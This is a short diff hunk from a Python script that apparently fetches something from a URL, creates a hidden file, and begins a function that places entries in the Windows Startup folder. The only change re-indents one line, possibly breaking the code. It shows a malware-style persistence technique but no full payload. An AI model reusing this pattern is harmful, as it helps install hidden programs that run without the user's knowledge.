@@ -66,7 +66,7 @@ def run(url, file_path):
     }
     }""")
 
-    create_hidden_file(directory)
+        create_hidden_file(directory)
     
     def add_to_startup(path, name):
         startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
